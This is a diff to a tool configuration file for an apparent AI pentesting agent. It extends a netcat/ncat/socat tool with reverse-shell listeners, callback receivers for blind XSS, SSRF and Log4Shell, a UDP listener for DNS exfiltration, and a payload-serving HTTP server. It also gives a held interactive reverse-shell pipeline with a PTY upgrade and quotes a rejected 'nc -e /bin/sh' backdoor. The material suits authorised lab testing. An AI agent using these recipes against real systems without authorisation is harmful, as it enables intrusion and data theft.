@@ -25,22 +25,41 @@ kind: cli
 #   socat        Address-pair toolkit. Different argv shape:
 #                 `socat ADDR1 ADDR2` (no flags-then-host). The most
 #                 flexible of the four; can bridge TCP <-> UNIX sockets,
-#                 STDIN <-> SSL, etc. Out-of-scope ADDR types: anything
-#                 that creates a long-running listener (LISTEN, FORK,
-#                 EXEC) — those belong in the `netcat` (kind:mcp) tool.
+#                 STDIN <-> SSL, etc. As of v2.0 (May 2026) listener
+#                 ADDR types (TCP-LISTEN, FORK, OPENSSL-LISTEN) are
+#                 in scope under the consolidated tool-runner pattern.
+#                 socat EXEC remains discouraged (backdoor primitive).
 #
-# All operations are STATELESS one-shots. Listener state lives in the
-# SEPARATE `netcat` (kind:mcp) tool — see see_also for the boundary.
+# Listener state lives ON DISK under /session/output/ via a tail-f-into-pipe
+# pattern (see usage_patterns + gotchas) — no wrapper script, no MCP server.
+# Tool-runner spawns are leaf executors that read/write these files.
+#
+# CONSOLIDATION (May 2026): this tool is the unified successor of the
+# legacy `netcat` (kind:mcp) tool. The MCP wrapper exposed 14 stateful
+# methods (listen / listener_read / listener_write / http_listen /
+# http_requests / http_file / udp_listen / udp_packets / udp_send /
+# exec / connect / check_port / get_interfaces / list / stop). All 14
+# are now covered HERE via raw kind:cli usage_patterns + gotchas. The
+# legacy `netcat` tool stays untouched during the parallel period and
+# is deleted once Tool 3 (shell-session) also clears live validation.
 
-version: "1.0"
+version: "2.0"
+# NB: searchable aliases ("netcat", "ncat", "socat", "nc.openbsd") live
+# in routing.triggers — that's what tool_registry_search actually
+# matches against. No separate `aliases:` field is consumed by the
+# registry build today; if one is added later, the surface here is
+# already "this tool answers to all four names."
 description: >
-  Stateless one-shot port operations: nc, ncat, socat, and
-  netcat-traditional for TCP / UDP probe, banner grab, bind-shell
-  connect, and small file transfer. Each invocation opens ONE
-  connection, performs the operation, and exits — no state persists
-  between calls.
+  Network-utility multi-binary toolkit unifying the legacy `nc`
+  (kind:cli, one-shot port ops) and `netcat` (kind:mcp, stateful
+  listeners) tools into a single kind:cli surface driven by
+  tool-runner. Covers TCP / UDP probe, banner grab, bind-shell
+  connect, file transfer, AND stateful operations: TCP listener
+  (reverse-shell catch), HTTP capture / serve, UDP listener,
+  held interactive shell. State persists ON DISK at
+  /session/output/listener-<port>/ — no wrapper, no MCP server.
 
-  Common forms:
+  Common one-shot forms:
 
     nc -z -v -w 3 10.10.10.5 22                          # TCP open?
     nc -z -v -w 3 10.10.10.5 22-1024                     # range scan
@@ -49,33 +68,22 @@ description: >
     nc -w 5 10.10.10.5 4444                              # bind-shell connect (stdin → cmd)
     socat - TCP:10.10.10.5:80                            # stdio <-> TCP
 
-  Out-of-scope (route to netcat kind:mcp instead):
+  Stateful forms (now in scope — see usage_patterns + gotchas):
 
-    nc -l -p 4444             ← reverse-shell listener (stateful)
-    nc -l -k -p 8080          ← keep-listening (stateful)
-    socat TCP-LISTEN:4444,fork EXEC:/bin/sh   ← bind-shell host (stateful)
-    HTTP server / UDP listener / captured-request inspection
-
-  These all need a long-running asyncio process that cli_in_container's
-  one-shot model cannot keep alive. The `netcat` (kind:mcp) tool owns
-  every "listener" / "server" / "captured packet inspection" verb — see
-  reject_flags for the per-binary trap list and see_also.netcat for
-  the routing reason.
+    timeout 60 ncat -lvnp 4444 -q 2 > /session/output/cap.log    # one-shot listener
+    timeout 600 ncat -lvnp 8080 -k > /session/output/http.log    # HTTP callback
+    bash -c 'tail -f /session/output/listener-4444/cmd | ncat -lvnp 4444 \
+            > /session/output/listener-4444/out'                 # held interactive shell
 
   Output is PURE TEXT on stdout: whatever the remote service emits,
   plus (under `-v` / `-vv`) connection state messages on stderr.
+  Held listener state lands in /session/output/listener-<port>/ and
+  is read by separate tool-runner spawns via the bash / Read tools.
 
-  This tool is BORN kind:cli — there are no legacy methods to
-  preserve. The complementary stateful operations remain in the
-  unchanged `netcat` (kind:mcp) tool.
-
-# NB: independent image — NOT shared with the netcat tool. Both images
-# install the same Debian package set (netcat-traditional / ncat / socat /
-# iproute2 / python3-full) so they stay byte-identical at the
-# system-binary level, but the Python entrypoint differs (nc has the
-# minimal kind:cli subclass; netcat has the 1567-LOC stateful server).
-# Keeping the images independent avoids inter-tool coupling at registry-
-# hash time.
+# NB: image already has nc / ncat / socat / netcat-traditional / python3 /
+# tee / timeout / od / ip / socat — everything needed for the consolidated
+# surface. No Dockerfile changes required for this consolidation; it's
+# pure tool.yaml.
 image: "ghcr.io/silicon-works/mcp-tools-nc:latest"
 image_size_mb: 150
 
@@ -99,6 +107,12 @@ capabilities:
   - udp_send
   - file_transfer
   - tcp_probe
+  - reverse_shell_listener
+  - http_callback_capture
+  - http_file_serve
+  - udp_listener
+  - interactive_held_shell
+  - oob_callback_receiver
 
 phases:
   - reconnaissance
@@ -120,13 +134,16 @@ routing:
     - "connect to a BIND shell already planted by an earlier exploit"
     - "small one-shot file transfer over a known-up TCP connection"
     - "ad-hoc protocol probing (send a fixed string, capture the response, exit)"
+    - "TCP listener for reverse-shell catch (one-shot OR held interactive)"
+    - "HTTP callback receiver for OOB testing (blind XSS / SSRF / RCE / Log4Shell)"
+    - "HTTP file server for payload delivery (python3 -m http.server)"
+    - "UDP listener for DNS exfil / packet capture"
+    - "held interactive reverse shell with command-injection via tail|ncat pattern"
+    - "out-of-band callback proof (catches a single connection then exits via -q 2)"
   never_use_for:
-    - "starting a TCP listener for a reverse shell (use netcat kind:mcp tool)"
-    - "starting an HTTP server to capture XSS / CSRF callbacks (use netcat kind:mcp tool)"
-    - "starting a UDP listener for DNS exfil capture (use netcat kind:mcp tool)"
     - "multi-port / multi-host scanning at scale (use nmap — far more comprehensive)"
-    - "persistent reverse / bind shell sessions (use shell-session)"
     - "complex HTTP requests with custom encoding (use curl)"
+    - "persistent SSH-based interactive shells with auth (use shell-session for SSH; this tool is for raw TCP holding)"
   triggers:
     - "nc -z"
     - "port check"
@@ -137,15 +154,36 @@ routing:
     - "ncat connect"
     - "socat connect"
     - "one-shot port"
-  prefer_over: []
+    - "reverse shell"
+    - "reverse-shell listener"
+    - "TCP listener"
+    - "HTTP listener"
+    - "HTTP callback"
+    - "OOB callback"
+    - "out-of-band capture"
+    - "blind XSS callback"
+    - "SSRF callback"
+    - "Log4Shell callback"
+    - "interactsh-style"
+    - "UDP listen"
+    - "udp_listen"
+    - "udp_packets"
+    - "udp_send"
+    - "http_listen"
+    - "http_requests"
+    - "http_file"
+    - "listener"
+    - "netcat"
+    - "ncat"
+    - "socat"
+  prefer_over:
+    - "netcat"
 
 see_also:
-  - tool: netcat
-    reason: "Use netcat (kind:mcp) for STATEFUL operations: TCP listener (reverse-shell catch), HTTP server (XSS / CSRF / cookie capture), UDP listener (packet capture), captured-request inspection (http_requests, listener_read / listener_write). All flags / verbs that require a long-running listener live there. This nc tool is for ONE-SHOT port operations only — every invocation opens, talks, and closes within a single cli_in_container process. The `-l` / `-k` listener flags are REJECTED here via reject_flags."
   - tool: nmap
     reason: "Use nmap for any port scan beyond a handful of ports. nc -z is fine for 'is port 22 open right now?' single-shot checks; nmap is far more comprehensive for service detection (-sV), OS fingerprinting (-O), full-range sweeps (-p-), UDP scanning (-sU), and scripted discovery (-sC). If the agent is checking >20 ports or wants version info, prefer nmap."
-  - tool: shell-session
-    reason: "Use shell-session (kind:mcp) for PERSISTENT shells after a reverse-shell pop or SSH login. nc here can CONNECT to a bind shell (one-shot send + receive) but cannot drive a multi-command interactive session. If the agent needs sustained shell state (cd / env / set -x) over many follow-ups, pivot to shell-session."
+  - tool: ssh
+    reason: "Use `ssh` (kind:cli v2.0) for SSH-authenticated remote shells with credential management. Its ControlMaster pattern holds a persistent SSH socket at /session/output/sshctl/ which separate tool-runner spawns reuse without re-auth. Pick `ssh` when you have SSH creds + want connection multiplexing + scp file transfer; pick THIS (`nc`) tool when catching an opportunistic reverse shell from an exploit (no SSH creds, raw TCP only). The legacy `shell-session` (kind:mcp) tool was retired May 2026 — its 9 methods now live in ssh + nc."
   - tool: curl
     reason: "Use curl for HTTP requests with custom headers / encoding / auth / cookies. nc / ncat / socat can speak raw HTTP but lack curl's ergonomics and TLS handling. Use nc only for raw-TCP banner grabs against non-HTTP services (SSH, SMTP, FTP, IRC)."
   - tool: ssh
@@ -183,45 +221,36 @@ target_extraction:
     group: 1
     parse_as: "raw"
 
-# Stateful flags that cannot work under cli_in_container (one-shot
-# model; no persistent nc / ncat / socat process to keep a listener
-# alive). Routed to the `netcat` kind:mcp tool instead.
+# Dangerous flags that bypass argv inspection (exec-on-connection
+# backdoor primitives). Listener flags (-l / -k / -L / --listen /
+# --keep-open) are NO LONGER REJECTED — see reject_flags_reason
+# below for the v2.0 consolidation rationale.
 reject_flags:
-  - "-l"      # nc / ncat: LISTEN mode (reverse-shell catch)  — STATEFUL
-  - "-k"      # nc / ncat: KEEP-listening (multi-connection listener) — STATEFUL
-  - "-L"      # netcat-traditional: alternate listen flag — STATEFUL
-  - "--listen"        # ncat long-form listen
-  - "--keep-open"     # ncat long-form keep-listening
-  - "--exec"          # ncat: exec a command on connection (stateful + dangerous)
-  - "--sh-exec"       # ncat: shell-exec on connection (stateful + dangerous)
-  - "-c"              # netcat-traditional: command on connection (-c CMD) — STATEFUL
-  - "-e"              # netcat-traditional: -e CMD (exec on connect) — STATEFUL + DANGEROUS
+  - "--exec"          # ncat: exec a command on connection — DANGEROUS backdoor primitive
+  - "--sh-exec"       # ncat: shell-exec on connection — DANGEROUS
+  - "-c"              # netcat-traditional: command on connection (-c CMD) — DANGEROUS
+  - "-e"              # netcat-traditional: -e CMD (exec on connect) — DANGEROUS
 reject_flags_reason: >
-  Listener flags (`-l`, `-k`, `-L`, `--listen`, `--keep-open`) and
-  exec-on-connection flags (`-e`, `-c`, `--exec`, `--sh-exec`) create
-  PERSISTENT state: the nc / ncat process MUST stay running for the
-  duration of the listener / shell. cli_in_container is one-shot — the
-  process exits as soon as run_cli returns, killing the listener and
-  any spawned shell.
-
-  Use the `netcat` (kind:mcp) tool for ALL listener operations: TCP
-  reverse-shell catch (listen / listener_read / listener_write), HTTP
-  server (http_listen / http_requests), UDP listener (udp_listen /
-  udp_packets), captured-request inspection. The `netcat` tool stays
-  kind:mcp specifically because cli_in_container can't host long-lived
-  asyncio listeners.
-
-  Exec-on-connection flags (`-e`, `-c`) are ALSO rejected for safety —
-  they're a classic backdoor primitive (`nc -lvp 4444 -e /bin/sh`) and
+  Exec-on-connection flags (`-e`, `-c`, `--exec`, `--sh-exec`) are
+  REJECTED for safety. They're a classic backdoor primitive
+  (`nc -lvp 4444 -e /bin/sh` spawns a remote shell on connect) and
   even in the CONNECT direction they enable arbitrary local command
   execution that bypasses cli_in_container's argv inspection.
 
-  socat's listener / fork modes (TCP-LISTEN, FORK, OPENSSL-LISTEN,
-  EXEC) are not in the reject_flags list because socat uses an
-  ADDRESS-PAIR syntax instead of `-l`-style flags. Reject those at
-  the address-string level — see gotchas. Practically: agents should
-  not emit a socat call whose first ADDR contains `LISTEN` or `EXEC`
-  here; route to the netcat kind:mcp tool instead.
+  Listener flags (`-l`, `-k`, `-L`, `--listen`, `--keep-open`) are
+  NOW ALLOWED (May 2026 consolidation). The previous restriction
+  reflected a one-shot kind:cli model that pre-dated the tool-runner
+  architecture. Held listener state now lives on disk under
+  /session/output/listener-<port>/ via the tail|ncat pipeline pattern
+  (see usage_patterns + gotchas). cli_in_container holds the listener
+  for the full max_runtime_seconds; separate tool-runner spawns read
+  the captured output via the bash / Read primitives.
+
+  socat's listener / fork modes (TCP-LISTEN, FORK, OPENSSL-LISTEN)
+  are similarly allowed at the address-string level. socat EXEC
+  remains discouraged — it's the same backdoor primitive as nc -e,
+  just with different argv shape. Document in gotchas; not formally
+  rejected because socat addresses are positionals.
 
 # Per-tool value-taking flags whose values must NOT be confused with
 # the positional host argument. Verified against:
@@ -407,6 +436,43 @@ usage_patterns:
     command: "--version"
     when: "Print Nmap ncat version (e.g., 'Ncat: Version 7.94 ( https://nmap.org/ncat )'). target=null."
 
+  # ── LISTENER patterns (consolidated from netcat MCP, May 2026) ──
+
+  - name: "ncat — one-shot TCP listener (OOB callback proof)"
+    binary: "ncat"
+    command: "-lvnp <port> -q 2 > /session/output/cap-<port>.log"
+    when: "Catch a single inbound connection then exit cleanly. -q 2 quits 2s after EOF on the captured connection. Use for blind-XSS / SSRF / blind-RCE / Log4Shell callback proof — the moment the target authenticates / triggers, you get the request and the listener releases the port. target=null (no remote target; LISTEN binds locally). For longer-lived multi-connection capture, use the 'HTTP callback receiver' pattern below."
+
+  - name: "ncat — HTTP callback receiver (time-bounded, multi-connection)"
+    binary: "bash"
+    command: "-c 'timeout <seconds> ncat -lvnp <port> -k > /session/output/http-<port>.log 2>&1'"
+    when: "Long-lived raw-TCP listener for HTTP callback capture (cookies, query strings, blind-XSS payloads, SSRF probes). -k = keep listening across multiple connections. timeout NN = hard cap so the call exits cleanly at NN seconds. Captures raw HTTP request bytes (no response sent — clients see connection close). For legitimate HTTP serving with response support, use 'python3 -m http.server' below. target=null."
+
+  - name: "ncat — HTTPS callback receiver (replaces netcat MCP http_listen with https=true)"
+    binary: "bash"
+    command: "-c 'timeout <seconds> ncat -lvnp <port> -k --ssl > /session/output/https-<port>.log 2>&1'"
+    when: "HTTPS variant of the HTTP callback receiver. ncat's `--ssl` auto-generates a self-signed certificate (matches netcat MCP's https=true default behavior). Use port 443 or 8443. Victim-side curl / browser must accept self-signed (curl -k or click-through). For custom cert/key (replaces netcat MCP cert/key params): write cert.pem + key.pem to /session/output/tls/ via Write tool, then `ncat -lvnp <port> -k --ssl --ssl-cert /session/output/tls/cert.pem --ssl-key /session/output/tls/key.pem`. Captures decrypted HTTP bytes after TLS termination. target=null."
+
+  - name: "ncat — held interactive reverse shell (tail|ncat pipeline)"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/listener-<port> && touch /session/output/listener-<port>/cmd && exec tail -f /session/output/listener-<port>/cmd | ncat -lvnp <port> > /session/output/listener-<port>/out 2>&1'"
+    when: "Hold an interactive reverse shell across many tool-runner spawns. Listener stays up for max_runtime_seconds (24h default). Separate spawns inject commands via `echo 'whoami' >> /session/output/listener-<port>/cmd` and read output via Read on .../out. Use MARKER_$$ pattern for completion stability and PTY upgrade one-liner for sudo/vim/etc. (see gotchas). target=null. Termination via timeout NN wrapper or max_runtime cap (NOT via exit\\n in cmd)."
+
+  - name: "python3 — HTTP file server for payload delivery"
+    binary: "bash"
+    command: "-c 'mkdir -p /session/output/serve && cd /session/output/serve && timeout <seconds> python3 -m http.server <port>'"
+    when: "Serve files under /session/output/serve/ over HTTP for victim-side wget / curl / certutil downloads of payloads. Stdlib http.server, no extra deps. Drop the payload file into /session/output/serve/ via the Write tool BEFORE starting the server. Stops at <seconds> via timeout. target=null. For passive request capture without response, use 'HTTP callback receiver' above instead."
+
+  - name: "ncat — UDP listener (DNS exfil / packet capture)"
+    binary: "bash"
+    command: "-c 'timeout <seconds> ncat -ulvnp <port> > /session/output/udp-<port>.log 2>&1'"
+    when: "UDP listener for capturing DNS exfil queries, syslog packets, blind-RCE UDP callbacks. -u = UDP mode. timeout NN bounds runtime. Output is raw bytes; for DNS specifically prefer a tool that parses (responder / dnsmasq) but for ad-hoc payload-capture this is enough. target=null."
+
+  - name: "ncat — UDP send (one-shot)"
+    binary: "ncat"
+    command: "-u -w 2 <host> <port>"
+    when: "Send a UDP datagram from stdin (pipe via cli_in_container's stdin_data). -u = UDP mode, -w 2 = receive timeout 2s (UDP has no FIN). Use for DNS / SNMP / syslog / NTP one-shot probes. For complex protocol-specific payloads, prefer scapy."
+
 output_formats:
   - flag: ""
     format: "text"
@@ -445,8 +511,8 @@ common_options:
     - "-p PORT: nc / ncat — source port (NB: when -l is rejected, -p is unambiguously SOURCE PORT here)."
 
 gotchas:
-  - "MULTI-BINARY toolkit. Pick the right binary per task: `nc` (smallest flag surface, canonical -z port check), `ncat` (richest flags — TLS, proxy, --send-only / --recv-only), `socat` (most flexible — address-pair syntax, can bridge any two endpoints), `netcat-traditional` (legacy nc, rarely needed). Each usage_pattern declares `binary:` explicitly. cli_in_container forwards the chosen binary; there is NO top-level `binary:` field."
-  - "LISTENER OPERATIONS ARE FORBIDDEN HERE. -l, -k, -L, --listen, --keep-open are in reject_flags. socat LISTEN-style ADDRs (TCP-LISTEN, OPENSSL-LISTEN, FORK) are NOT formally rejected because they're positionals (not flags), but they are OUT OF SCOPE — route to the `netcat` (kind:mcp) tool. Same for ncat's --http-server. The kind:cli model can't host long-running listeners; cli_in_container exits as soon as run_cli returns, killing any listener."
+  - "MULTI-BINARY toolkit. Pick the right binary per task: `nc` (smallest flag surface, canonical -z port check), `ncat` (richest flags — TLS, proxy, --send-only / --recv-only, listener -l / -k), `socat` (most flexible — address-pair syntax, can bridge any two endpoints), `netcat-traditional` (legacy nc, rarely needed). Each usage_pattern declares `binary:` explicitly. cli_in_container forwards the chosen binary; there is NO top-level `binary:` field."
+  - "LISTENER OPERATIONS ARE NOW IN SCOPE (v2.0, May 2026). -l, -k, -L, --listen, --keep-open are ALLOWED. ncat handles listener-mode cleanly even when stdin is closed (verified — listener stays up under cli_in_container's headless invocation, no bash-wrap needed). For HELD interactive shells (bidirectional command-injection), use the tail|ncat pipeline pattern (see usage_patterns: 'Held interactive reverse shell'). For ONE-SHOT capture, use ncat -lvnp PORT -q 2 — the -q 2 quits 2s after EOF on the captured connection."
   - "EXEC-ON-CONNECTION FLAGS REJECTED. -e (netcat-traditional), -c (netcat-traditional), --exec / --sh-exec (ncat) all spawn a local command on connection. Even on the CONNECT side this is a backdoor primitive that bypasses cli_in_container's argv inspection. Use scp / ssh for legitimate command execution; never use nc -e."
   - "`nc -z` IS THE CANONICAL TCP PORT CHECK. -z = scan mode (no data sent — connect, then close). For UDP, -uz is fundamentally unreliable (UDP has no RST → port reports OPEN regardless of state). For real port scans, use nmap (single-shot) or nmap -p- -T4 (sweep)."
   - "`-w SECONDS` IS CRITICAL. Without -w, nc waits for the kernel TCP timeout (75+ s) on filtered ports. Idle_timeout_seconds is 60 s — without -w 3 / -w 5, a single filtered-port probe will trip the wrapper timeout. Always pass -w on connect calls."
@@ -459,6 +525,15 @@ gotchas:
   - "UDP RELIABILITY. UDP is connectionless; nc -uz reports OPEN regardless of remote port state because there's no RST. Use nc -u for SENDING (where you control the payload and don't need a response confirmation), but for SCANNING UDP ports use nmap -sU (which sends protocol-specific probes and waits for ICMP unreachable replies)."
   - "NUMBER FOR PORT vs IP. The first positional after all flags is the host (IP / DNS name); the second is the port (integer / range). target_extraction extracts the host (group 1). The port is NOT extracted as a target — that's a port number, not a network target. This matches the registry's host-vs-port distinction."
   - "DON'T FORGET -n FOR FAST-FAIL. If the host is an IP, pass -n to skip DNS resolution. Saves a second on every call and avoids spurious 'Could not resolve hostname' errors when /etc/resolv.conf isn't reachable."
+  - "HELD-LISTENER PATTERN (interactive reverse shell). Pipe a tail-f'd command file into ncat, capture output to another file, both under /session/output/listener-<port>/. Recipe: `binary: bash, command: -c 'tail -f /session/output/listener-<port>/cmd | ncat -lvnp <port> > /session/output/listener-<port>/out'`. The pipe form is critical — `<` redirect form does NOT work. Each separate tool-runner spawn appends one command to .../cmd via `echo 'whoami' >> .../cmd` and reads output by Read'ing .../out. The listener stays live for the full max_runtime_seconds (default 24h via cli_in_container). Verified empirically 2026-05-08."
+  - "MARKER_$$ PATTERN for command-completion stability. Held shells emit output asynchronously — agent doesn't know when a command has finished. Convention: agent appends a unique marker to every command and polls until it appears. Recipe: `echo 'whoami; echo MARKER_$RANDOM_$$' >> .../cmd`. Then Read .../out repeatedly until MARKER_<id> shows up — that's the completion signal. Without this, agent reads partial output and may treat in-progress data as final. Document the marker value used so subsequent reads can grep for it."
+  - "POSITION-TRACKED DELTA READ. The held-shell out_log grows unbounded. Reading the whole file every poll is O(N²) tokens for a long session. Track byte position per session (in agent state) and read only new bytes: `tail -c +<N>` reads from byte N onward, where N is the previous file size + 1. Or `sed -n '<L>,$p'` from line L. Either keeps token cost linear instead of quadratic. Critical for sessions with >50 commands."
+  - "PTY UPGRADE for held reverse shells. Many programs (sudo, vim, su, passwd, htop, gdb, less) detect non-TTY stdin and refuse to run, exit immediately, or hang. Fix once after shell is held: append `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` to the cmd_log. Verified empirically: subsequent `tty` returns /dev/pts/0 and `sys.stdin.isatty()` returns True. Run upgrade ONCE per held shell. Without PTY upgrade, sudo will silently swallow the next command (verified failure mode 2026-05-08)."
+  - "TERMINATION via timeout NN, NOT via exit\\n. Sending `exit\\n` to cmd_log terminates the REMOTE bash but leaves the listener container running because the tail -f process keeps running. The listener won't release the port until the container itself exits. Two clean termination options: (1) wrap the held-listener invocation with `timeout NN bash -c '...'` so the container dies at NN seconds (preserves files on disk via SIGKILL — they're already written); (2) rely on cli_in_container's max_runtime_seconds cap. Don't rely on `exit\\n` for cleanup."
+  - "MULTI-SESSION FILENAME CONVENTION. With multiple concurrent listeners, agent uses port-based naming: /session/output/listener-<port>/cmd and /session/output/listener-<port>/out. Port is unique per listener (the OS forbids two binds to the same port), so collisions are structurally impossible. Track active listeners by Read'ing /session/output/listener-* — each directory is one session."
+  - "BINARY-OUTPUT HANDLING. If a held shell runs `cat /bin/<binary>` or similar, raw bytes hit out_log and corrupt the LLM's UTF-8 view (file size grows past actual byte count due to invalid-byte escaping). Avoid: agent commands like `cat <binary> | od -An -tx1` (od IS in the image) or `python3 -c 'import sys; print(sys.stdin.buffer.read().hex())' < <binary>` (python3 IS in the image). Don't `cat` binaries directly into the held-shell pipeline. Note: xxd is NOT in the image."
+  - "LIVENESS DETECTION when victim disappears. If the remote shell process dies (victim host reboots, connection drops), agent appends to cmd_log but nothing happens — out_log stops growing silently, no error surface. Heuristic: after sending a command, expect the marker within ~10s (over fast network) or ~30s (over VPN like tun0). If no marker appears AND out_log size hasn't changed, the shell is dead. Restart the listener container and wait for a fresh callback."
+  - "GET LHOST / LIST INTERFACES (replaces netcat MCP get_interfaces). Use `ip -j addr` for parseable JSON. nc image has python3 but NOT jq, so parse via python: `ip -j addr | python3 -c 'import json,sys; [print(i[\"ifname\"], next((a[\"local\"] for a in i.get(\"addr_info\",[]) if a[\"family\"]==\"inet\"), \"\")) for i in json.load(sys.stdin)]'`. Alternatively `ip addr` for human-readable output. The legacy netcat MCP get_interfaces returned `[{name, ip}, ...]`; the equivalent via cli_in_container is `binary: bash, command: -c 'ip -j addr'` and the agent parses (verified — 8 interfaces enumerated cleanly including tun0). tun0 is the typical VPN interface for HTB / lab engagements; that's the LHOST you'll bind listeners to (although ncat -lvnp binds 0.0.0.0 by default, so all interfaces accept inbound)."
 
 failure_signatures:
   # Layer-diverse signals (SKILL #11) — at least 6 distinct verifiable
